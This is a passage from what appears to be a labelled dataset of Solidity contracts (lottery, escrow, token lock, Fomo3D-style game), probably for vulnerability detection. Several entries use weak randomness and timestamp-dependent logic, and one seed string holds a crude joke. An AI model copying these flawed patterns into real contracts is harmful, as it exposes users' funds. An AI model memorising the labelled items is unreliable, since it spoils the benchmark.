msg.value, secretKey_P, msg.sender);        TicketPool[secretKey_D_hash] = Game(secretKey_P,false,false,0,block.timestamp,msg.sender,msg.value);    }        function award(bytes32 secretKey_D) public {                require(Drawer == msg.sender);                bytes32 secretKey_D_hash = keccak256(secretKey_D);                Game local_ = TicketPool[secretKey_D_hash];                require(local_.Time != 0 && !local_.isPlay);                uint game_result = 0;        uint[] memory RandomResult = new uint[](9);                RandomResult[0] = uint(keccak256("Pig World is an AWESOME team",secretKey_D,'a',local_.SecretKey_P)) % 1000 + 1;        RandomResult[1] = uint(keccak256(local_.SecretKey_P,"Every Game in our world is provably fair",secretKey_D,'b')) % 1000 + 1;        RandomResult[2] = uint(keccak256('c',secretKey_D,"OMG it is a revolution dapp",local_.SecretKey_P)) % 1000 + 1;        RandomResult[3] = uint(keccak256(secretKey_D,"hahahaha",local_.SecretKey_P,'d',"thanks for our team member and all player support.")) % 1000 + 1;        RandomResult[4] = uint(keccak256("CC is our CEO",secretKey_D,"he can eat Betel nut",local_.SecretKey_P,'e')) % 1000 + 1;        RandomResult[5] = uint(keccak256(20180612,"justin is our researcher",secretKey_D,"and he love little girl(at least 18, so it is ok)",local_.SecretKey_P,'f')) % 1000 + 1;        RandomResult[6] = uint(keccak256("jeremy is our marketing",secretKey_D,'g',local_.SecretKey_P,"he is very humble and serious")) % 1000 + 1;        RandomResult[7] = uint(keccak256('h',secretKey_D,"We are a geek team",local_.SecretKey_P,"we love blockchain")) % 1000 + 1;        RandomResult[8] = uint(keccak256(secretKey_D,"hope you win a big prize",local_.SecretKey_P,"love you all!!!",'i')) % 1000 + 1;                for (uint n = 0; n < 9; n++) {                        if(RandomResult[n]< 81){                RandomResult[n] = 0;            } else if(RandomResult[n]< 168){                RandomResult[n] = 1;            } else if(RandomResult[n]< 266){                RandomResult[n] = 2;            } else if(RandomResult[n]< 381){                RandomResult[n] = 3;            } else if(RandomResult[n]< 535){                RandomResult[n] = 4;            } else if(RandomResult[n]< 749){                RandomResult[n] = 5;            } else if(RandomResult[n]< 1001){                RandomResult[n] = 6;            }        }                    for(uint nn = 0; nn < 6; nn++){            uint count = 0;            for(uint p = 0; p < 9; p++){                if(RandomResult[p] == nn)                    count ++;            }                        if(count >= 3 && nn == 0)                game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.1 ether));                            if(count >= 3 && nn == 1)                game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.08 ether));                            if(count >= 3 && nn == 2)                game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.06 ether));                            if(count >= 3 && nn == 3)                game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.04 ether));                            if(count >= 3 && nn == 4)                game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.02 ether));                             if(count >= 3 && nn == 5)                game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.01 ether));         }                    if(game_result != 0){            TicketPool[secretKey_D_hash].Result = game_result;            if (address(this).balance >= game_result && TicketPool[secretKey_D_hash].Buyer.send(game_result)) {                TicketPool[secretKey_D_hash].isPay = true;                Pay(secretKey_D_hash,TicketPool[secretKey_D_hash].Buyer, game_result);            } else {                Owe(secretKey_D_hash, TicketPool[secretKey_D_hash].Buyer, game_result);                TicketPool[secretKey_D_hash].isPay = false;            }          } else {            TicketPool[secretKey_D_hash].isPay = true;        }                Result(secretKey_D_hash, secretKey_D, TicketPool[secretKey_D_hash].Buyer, RandomResult, game_result, block.timestamp);        TicketPool[secretKey_D_hash].isPlay = true;    }        function () public payable {           }        function withdraw(uint withdrawEther_) public onlyOwner {        msg.sender.transfer(withdrawEther_);    }        function changeLimit(uint _bottom, uint _top) public onlyOwner {        LimitBottom = _bottom;        LimitTop = _top;    }        function changeDrawer(address drawer_) public onlyOwner {        Drawer = drawer_;    }        function getisPlay(bytes32 secretKey_D_hash) public constant returns (bool isplay){        return TicketPool[secretKey_D_hash].isPlay;    }        function getTicketTime(bytes32 secretKey_D_hash) public constant returns (uint Time){        return TicketPool[secretKey_D_hash].Time;    }        function chargeOwe(bytes32 secretKey_D_hash) public {        require(!TicketPool[secretKey_D_hash].isPay);        require(TicketPool[secretKey_D_hash].isPlay);        require(TicketPool[secretKey_D_hash].Result != 0);                if(address(this).balance >= TicketPool[secretKey_D_hash].Result){            if (TicketPool[secretKey_D_hash].Buyer.send(TicketPool[secretKey_D_hash].Result)) {                TicketPool[secretKey_D_hash].isPay = true;                OwePay(secretKey_D_hash, TicketPool[secretKey_D_hash].Buyer, TicketPool[secretKey_D_hash].Result);            }        }     }}
0<CODESPLIT>contract Arbitrator is Ownable {  mapping(address => bool) private aribitratorWhitelist;  address private primaryArbitrator;  event ArbitratorAdded(address indexed newArbitrator);  event ArbitratorRemoved(address indexed newArbitrator);  event ChangePrimaryArbitratorWallet(address indexed newPrimaryWallet);  constructor() public {    primaryArbitrator = msg.sender;  }  modifier onlyArbitrator() {    require(aribitratorWhitelist[msg.sender] == true || msg.sender == primaryArbitrator);    _;  }  function changePrimaryArbitrator(address walletAddress) public onlyOwner {    require(walletAddress != address(0));    emit ChangePrimaryArbitratorWallet(walletAddress);    primaryArbitrator = walletAddress;  }  function addArbitrator(address newArbitrator) public onlyOwner {    require(newArbitrator != address(0));    emit ArbitratorAdded(newArbitrator);    aribitratorWhitelist[newArbitrator] = true;  }  function deleteArbitrator(address arbitrator) public onlyOwner {    require(arbitrator != address(0));    require(arbitrator != msg.sender);      emit ArbitratorRemoved(arbitrator);    delete aribitratorWhitelist[arbitrator];  }     function isArbitrator(address arbitratorCheck) external view returns(bool) {    return (aribitratorWhitelist[arbitratorCheck] || arbitratorCheck == primaryArbitrator);  }}
0<CODESPLIT>contract ApprovedWithdrawer is Ownable {  mapping(address => bool) private withdrawerWhitelist;  address private primaryWallet;  event WalletApproved(address indexed newAddress);  event WalletRemoved(address indexed removedAddress);  event ChangePrimaryApprovedWallet(address indexed newPrimaryWallet);  constructor() public {    primaryWallet = msg.sender;  }  modifier onlyApprovedWallet(address _to) {    require(withdrawerWhitelist[_to] == true || primaryWallet == _to);    _;  }  function changePrimaryApprovedWallet(address walletAddress) public onlyOwner {    require(walletAddress != address(0));    emit ChangePrimaryApprovedWallet(walletAddress);    primaryWallet = walletAddress;  }  function addApprovedWalletAddress(address walletAddress) public onlyOwner {    require(walletAddress != address(0));    emit WalletApproved(walletAddress);    withdrawerWhitelist[walletAddress] = true;  }  function deleteApprovedWalletAddress(address walletAddress) public onlyOwner {    require(walletAddress != address(0));    require(walletAddress != msg.sender);      emit WalletRemoved(walletAddress);    delete withdrawerWhitelist[walletAddress];  }     function isApprovedWallet(address walletCheck) external view returns(bool) {    return (withdrawerWhitelist[walletCheck] || walletCheck == primaryWallet);  }} 
1<CODESPLIT>contract CoinSparrow  is Ownable, Arbitrator, ApprovedWithdrawer, Pausable {     using SafeMath for uint256;        uint8 constant private STATUS_JOB_NOT_EXIST = 1;    uint8 constant private STATUS_JOB_CREATED = 2;    uint8 constant private STATUS_JOB_STARTED = 3;    uint8 constant private STATUS_HIRER_REQUEST_CANCEL = 4;                                                       uint8 constant private STATUS_JOB_COMPLETED = 5;    uint8 constant private STATUS_JOB_IN_DISPUTE = 6;    uint8 constant private STATUS_HIRER_CANCELLED = 7;    uint8 constant private STATUS_CONTRACTOR_CANCELLED = 8;    uint8 constant private STATUS_FINISHED_FUNDS_RELEASED = 9;    uint8 constant private STATUS_FINISHED_FUNDS_RELEASED_BY_CONTRACTOR = 10;    uint8 constant private STATUS_CONTRACTOR_REQUEST_CANCEL = 11;                                                             uint8 constant private STATUS_MUTUAL_CANCELLATION_PROCESSED = 12;             uint8 constant private COINSPARROW_CONTRACT_VERSION = 1;     event JobCreated(bytes32 _jobHash, address _who, uint256 _value);  event ContractorStartedJob(bytes32 _jobHash, address _who);  event ContractorCompletedJob(bytes32 _jobHash, address _who);  event HirerRequestedCancel(bytes32 _jobHash, address _who);  event ContractorRequestedCancel(bytes32 _jobHash, address _who);  event CancelledByHirer(bytes32 _jobHash, address _who);  event CancelledByContractor(bytes32 _jobHash, address _who);  event MutuallyAgreedCancellation(    bytes32 _jobHash,    address _who,    uint256 _hirerAmount,    uint256 _contractorAmount  );  event DisputeRequested(bytes32 _jobHash, address _who);  event DisputeResolved(    bytes32 _jobHash,    address _who,    uint256 _hirerAmount,    uint256 _contractorAmount  );  event HirerReleased(bytes32 _jobHash, address _hirer, address _contractor, uint256 _value);  event AddFeesToCoinSparrowPool(bytes32 _jobHash, uint256 _value);  event ContractorReleased(bytes32 _jobHash, address _hirer, address _contractor, uint256 _value);  event HirerLastResortRefund(bytes32 _jobHash, address _hirer, address _contractor, uint256 _value);  event WithdrawFeesFromCoinSparrowPool(address _whoCalled, address _to, uint256 _amount);  event LogFallbackFunctionCalled(address _from, uint256 _amount);        struct JobEscrow {         bool exists;                   uint32 hirerCanCancelAfter;         uint8 status;         uint32 jobCompleteDate;         uint32 secondsToComplete;         uint32 agreedCompletionDate;  }        uint256 private totalInEscrow;     uint256 private feesAvailableForWithdraw;     uint256 private MAX_SEND;     mapping(bytes32 => JobEscrow) private jobEscrows;     mapping(address => mapping(bytes32 => uint256)) private hirerEscrowMap;        modifier onlyHirer(address _hirer) {    require(msg.sender == _hirer);    _;  }     modifier onlyContractor(address _contractor) {    require(msg.sender == _contractor);    _;  }     modifier onlyHirerOrContractor(address _hirer, address _contractor) {    require(msg.sender == _hirer || msg.sender == _contractor);    _;  }        constructor(uint256 _maxSend) public {    require(_maxSend > 0);         MAX_SEND = _maxSend;  }     function() payable {         emit LogFallbackFunctionCalled(msg.sender, msg.value);  }     function createJobEscrow(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee,    uint32 _jobStartedWindowInSeconds,    uint32 _secondsToComplete  ) payable external whenNotPaused onlyHirer(_hirer)  {         require(msg.value == _value && msg.value > 0);         require(_fee < _value);         require(msg.value <= MAX_SEND);         require(_jobStartedWindowInSeconds > 0);         require(_secondsToComplete > 0);         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(!jobEscrows[jobHash].exists);         jobEscrows[jobHash] = JobEscrow(      true,      uint32(block.timestamp) + _jobStartedWindowInSeconds,      STATUS_JOB_CREATED,      0,      _secondsToComplete,      0);         totalInEscrow = totalInEscrow.add(msg.value);         hirerEscrowMap[msg.sender][jobHash] = msg.value;         emit JobCreated(jobHash, msg.sender, msg.value);  }        function hirerReleaseFunds(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  ) external onlyHirer(_hirer)  {    bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(jobEscrows[jobHash].exists);         require(hirerEscrowMap[msg.sender][jobHash] > 0);         uint256 jobValue = hirerEscrowMap[msg.sender][jobHash];         require(jobValue > 0 && jobValue == _value);         require(jobValue >= jobValue.sub(_fee));         require(totalInEscrow >= jobValue && totalInEscrow > 0);          emit HirerReleased(      jobHash,      msg.sender,      _contractor,      jobValue);          emit AddFeesToCoinSparrowPool(jobHash, _fee);         delete jobEscrows[jobHash];         delete hirerEscrowMap[msg.sender][jobHash];         feesAvailableForWithdraw = feesAvailableForWithdraw.add(_fee);         totalInEscrow = totalInEscrow.sub(jobValue);         _contractor.transfer(jobValue.sub(_fee));  }     function contractorReleaseFunds(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  ) external onlyContractor(_contractor)  {    bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(jobEscrows[jobHash].exists);         require(jobEscrows[jobHash].status == STATUS_JOB_COMPLETED);         require(block.timestamp > jobEscrows[jobHash].jobCompleteDate + 4 weeks);         uint256 jobValue = hirerEscrowMap[_hirer][jobHash];         require(jobValue > 0 && jobValue == _value);         require(jobValue >= jobValue.sub(_fee));         require(totalInEscrow >= jobValue && totalInEscrow > 0);    emit ContractorReleased(      jobHash,      _hirer,      _contractor,      jobValue);      emit AddFeesToCoinSparrowPool(jobHash, _fee);    delete jobEscrows[jobHash];      delete  hirerEscrowMap[_hirer][jobHash];           feesAvailableForWithdraw = feesAvailableForWithdraw.add(_fee);         totalInEscrow = totalInEscrow.sub(jobValue);         _contractor.transfer(jobValue.sub(_fee));  }     function hirerLastResortRefund(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  ) external onlyHirer(_hirer)  {    bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(jobEscrows[jobHash].exists);             require(jobEscrows[jobHash].status == STATUS_JOB_STARTED);         require(block.timestamp > jobEscrows[jobHash].agreedCompletionDate + 4 weeks);         uint256 jobValue = hirerEscrowMap[msg.sender][jobHash];         require(jobValue > 0 && jobValue == _value);         require(jobValue >= jobValue.sub(_fee));         require(totalInEscrow >= jobValue && totalInEscrow > 0);    emit HirerLastResortRefund(      jobHash,      _hirer,      _contractor,      jobValue);      delete jobEscrows[jobHash];      delete  hirerEscrowMap[_hirer][jobHash];           totalInEscrow = totalInEscrow.sub(jobValue);         _hirer.transfer(jobValue);  }        function jobStarted(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  ) external onlyContractor(_contractor)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(jobEscrows[jobHash].exists);         require(jobEscrows[jobHash].status == STATUS_JOB_CREATED);    jobEscrows[jobHash].status = STATUS_JOB_STARTED;      jobEscrows[jobHash].hirerCanCancelAfter = 0;    jobEscrows[jobHash].agreedCompletionDate = uint32(block.timestamp) + jobEscrows[jobHash].secondsToComplete;    emit ContractorStartedJob(jobHash, msg.sender);  }     function jobCompleted(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  ) external onlyContractor(_contractor)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);    require(jobEscrows[jobHash].exists);      require(jobEscrows[jobHash].status == STATUS_JOB_STARTED);      jobEscrows[jobHash].status = STATUS_JOB_COMPLETED;    jobEscrows[jobHash].jobCompleteDate = uint32(block.timestamp);    emit ContractorCompletedJob(jobHash, msg.sender);  }        function contractorCancel(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  ) external onlyContractor(_contractor)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);    uint256 jobValue = hirerEscrowMap[_hirer][jobHash];         require(jobEscrows[jobHash].exists);         require(jobValue > 0 && jobValue == _value);         require(jobValue >= jobValue.sub(_fee));         require(totalInEscrow >= jobValue && totalInEscrow > 0);    delete jobEscrows[jobHash];    delete  hirerEscrowMap[_hirer][jobHash];    emit CancelledByContractor(jobHash, msg.sender);    totalInEscrow = totalInEscrow.sub(jobValue);    _hirer.transfer(jobValue);  }     function hirerCancel(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  ) external onlyHirer(_hirer)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(jobEscrows[jobHash].exists);    require(jobEscrows[jobHash].hirerCanCancelAfter > 0);    require(jobEscrows[jobHash].status == STATUS_JOB_CREATED);    require(jobEscrows[jobHash].hirerCanCancelAfter < block.timestamp);    uint256 jobValue = hirerEscrowMap[_hirer][jobHash];         require(jobValue > 0 && jobValue == _value);         require(jobValue >= jobValue.sub(_fee));         require(totalInEscrow >= jobValue && totalInEscrow > 0);    delete jobEscrows[jobHash];    delete  hirerEscrowMap[msg.sender][jobHash];    emit CancelledByHirer(jobHash, msg.sender);    totalInEscrow = totalInEscrow.sub(jobValue);    _hirer.transfer(jobValue);  }     function requestMutualJobCancellation(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  ) external onlyHirerOrContractor(_hirer, _contractor)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(jobEscrows[jobHash].exists);    require(jobEscrows[jobHash].status == STATUS_JOB_STARTED);    if (msg.sender == _hirer) {      jobEscrows[jobHash].status = STATUS_HIRER_REQUEST_CANCEL;      emit HirerRequestedCancel(jobHash, msg.sender);    }    if (msg.sender == _contractor) {      jobEscrows[jobHash].status = STATUS_CONTRACTOR_REQUEST_CANCEL;      emit ContractorRequestedCancel(jobHash, msg.sender);    }  }     function processMutuallyAgreedJobCancellation(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee,    uint8 _contractorPercent,    bytes _hirerMsgSig,    bytes _contractorMsgSig  ) external  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(jobEscrows[jobHash].exists);    require(msg.sender == _hirer || msg.sender == _contractor);    require(_contractorPercent <= 100 && _contractorPercent >= 0);              require(      checkRefundSignature(_contractorPercent,_hirerMsgSig,_hirer)&&      checkRefundSignature(_contractorPercent,_contractorMsgSig,_contractor));    uint256 jobValue = hirerEscrowMap[_hirer][jobHash];         require(jobValue > 0 && jobValue == _value);         require(jobValue >= jobValue.sub(_fee));         require(totalInEscrow >= jobValue && totalInEscrow > 0);    totalInEscrow = totalInEscrow.sub(jobValue);    feesAvailableForWithdraw = feesAvailableForWithdraw.add(_fee);    delete jobEscrows[jobHash];    delete  hirerEscrowMap[_hirer][jobHash];    uint256 contractorAmount = jobValue.sub(_fee).mul(_contractorPercent).div(100);    uint256 hirerAmount = jobValue.sub(_fee).mul(100 - _contractorPercent).div(100);    emit MutuallyAgreedCancellation(      jobHash,      msg.sender,      hirerAmount,      contractorAmount);    emit AddFeesToCoinSparrowPool(jobHash, _fee);    if (contractorAmount > 0) {      _contractor.transfer(contractorAmount);    }    if (hirerAmount > 0) {      _hirer.transfer(hirerAmount);    }  }        function requestDispute(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  ) external onlyHirerOrContractor(_hirer, _contractor)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(jobEscrows[jobHash].exists);    require(      jobEscrows[jobHash].status == STATUS_JOB_STARTED||      jobEscrows[jobHash].status == STATUS_JOB_COMPLETED||      jobEscrows[jobHash].status == STATUS_HIRER_REQUEST_CANCEL||      jobEscrows[jobHash].status == STATUS_CONTRACTOR_REQUEST_CANCEL);    jobEscrows[jobHash].status = STATUS_JOB_IN_DISPUTE;    emit DisputeRequested(jobHash, msg.sender);  }     function resolveDispute(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee,    uint8 _contractorPercent  ) external onlyArbitrator  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);         require(jobEscrows[jobHash].exists);    require(jobEscrows[jobHash].status == STATUS_JOB_IN_DISPUTE);    require(_contractorPercent <= 100);    uint256 jobValue = hirerEscrowMap[_hirer][jobHash];         require(jobValue > 0 && jobValue == _value);         require(jobValue >= jobValue.sub(_fee));         require(totalInEscrow >= jobValue && totalInEscrow > 0);    totalInEscrow = totalInEscrow.sub(jobValue);    feesAvailableForWithdraw = feesAvailableForWithdraw.add(_fee);         delete jobEscrows[jobHash];    delete  hirerEscrowMap[_hirer][jobHash];    uint256 contractorAmount = jobValue.sub(_fee).mul(_contractorPercent).div(100);    uint256 hirerAmount = jobValue.sub(_fee).mul(100 - _contractorPercent).div(100);    emit DisputeResolved(      jobHash,      msg.sender,      hirerAmount,      contractorAmount);    emit AddFeesToCoinSparrowPool(jobHash, _fee);    _contractor.transfer(contractorAmount);    _hirer.transfer(hirerAmount);  }        function withdrawFees(address _to, uint256 _amount) onlyOwner onlyApprovedWallet(_to) external {         require(_amount > 0);    require(_amount <= feesAvailableForWithdraw && feesAvailableForWithdraw > 0);    feesAvailableForWithdraw = feesAvailableForWithdraw.sub(_amount);    emit WithdrawFeesFromCoinSparrowPool(msg.sender,_to, _amount);    _to.transfer(_amount);  }     function howManyFees() external view returns (uint256) {    return feesAvailableForWithdraw;  }     function howMuchInEscrow() external view returns (uint256) {    return totalInEscrow;  }     function setMaxSend(uint256 _maxSend) onlyOwner external {    require(_maxSend > 0);    MAX_SEND = _maxSend;  }     function getMaxSend() external view returns (uint256) {    return MAX_SEND;  }     function getContractVersion() external pure returns(uint8) {    return COINSPARROW_CONTRACT_VERSION;  }        function getJobStatus(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee) external view returns (uint8)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);    uint8 status = STATUS_JOB_NOT_EXIST;    if (jobEscrows[jobHash].exists) {      status = jobEscrows[jobHash].status;    }    return status;  }     function getJobCanCancelAfter(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee) external view returns (uint32)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);    uint32 hirerCanCancelAfter = 0;    if (jobEscrows[jobHash].exists) {      hirerCanCancelAfter = jobEscrows[jobHash].hirerCanCancelAfter;    }    return hirerCanCancelAfter;  }     function getSecondsToComplete(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee) external view returns (uint32)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);    uint32 secondsToComplete = 0;    if (jobEscrows[jobHash].exists) {      secondsToComplete = jobEscrows[jobHash].secondsToComplete;    }    return secondsToComplete;  }     function getAgreedCompletionDate(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee) external view returns (uint32)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);    uint32 agreedCompletionDate = 0;    if (jobEscrows[jobHash].exists) {      agreedCompletionDate = jobEscrows[jobHash].agreedCompletionDate;    }    return agreedCompletionDate;  }     function getActualCompletionDate(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee) external view returns (uint32)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);    uint32 jobCompleteDate = 0;    if (jobEscrows[jobHash].exists) {      jobCompleteDate = jobEscrows[jobHash].jobCompleteDate;    }    return jobCompleteDate;  }     function getJobValue(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee) external view returns(uint256)  {         bytes32 jobHash = getJobHash(      _jobId,      _hirer,      _contractor,      _value,      _fee);    uint256 amount = 0;    if (jobEscrows[jobHash].exists) {      amount = hirerEscrowMap[_hirer][jobHash];    }    return amount;  }     function validateRefundSignature(    uint8 _contractorPercent,    bytes _sigMsg,    address _signer) external pure returns(bool)  {    return checkRefundSignature(_contractorPercent,_sigMsg,_signer);  }     function checkRefundSignature(    uint8 _contractorPercent,    bytes _sigMsg,    address _signer) private pure returns(bool)  {    bytes32 percHash = keccak256(abi.encodePacked(_contractorPercent));    bytes32 msgHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32",percHash));    address addr = ECRecovery.recover(msgHash,_sigMsg);    return addr == _signer;  }     function getJobHash(    bytes16 _jobId,    address _hirer,    address _contractor,    uint256 _value,    uint256 _fee  )  private pure returns(bytes32)  {    return keccak256(abi.encodePacked(      _jobId,      _hirer,      _contractor,      _value,      _fee));  }}
1<CODESPLIT>contract MMOToken{    mapping (address => uint256) public lockAddress;    address public owner;    modifier onlyOwner() {        require(msg.sender == owner);        _;    }    function lockTime(address _to,uint256 _value) onlyOwner public returns (bool) {       if(_value > block.timestamp) {            lockAddress[_to] = _value;            return true;       }       return false;    }}
1<CODESPLIT>contract F3DPLUS is modularShort {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcShort for uint256;    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x0433c529Bb7FA84f18dfe49F0234c6815bD441FA);        address private admin = msg.sender;    string constant public name = "f3dplus";    string constant public symbol = "f3dplus";    uint256 private rndExtra_ = 0;          uint256 private rndGap_ = 2 minutes;              uint256 constant private rndInit_ = 3 hours;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 3 hours;                         uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              constructor()        public    {		                                     		                               fees_[0] = F3Ddatasets.TeamFee(30,0);            fees_[1] = F3Ddatasets.TeamFee(31,0);            fees_[2] = F3Ddatasets.TeamFee(50,0);           fees_[3] = F3Ddatasets.TeamFee(36,0);                              potSplit_[0] = F3Ddatasets.PotSplit(52,0);           potSplit_[1] = F3Ddatasets.PotSplit(25,0);            potSplit_[2] = F3Ddatasets.PotSplit(40,0);           potSplit_[3] = F3Ddatasets.PotSplit(34,0);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;    }             function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }         function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affCode, _team, _eventData_);    }    function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }    function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }         function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                 uint256 _now = now;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _eth;                 if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         F3Ddatasets.EventReturns memory _eventData_;             			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);			             _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         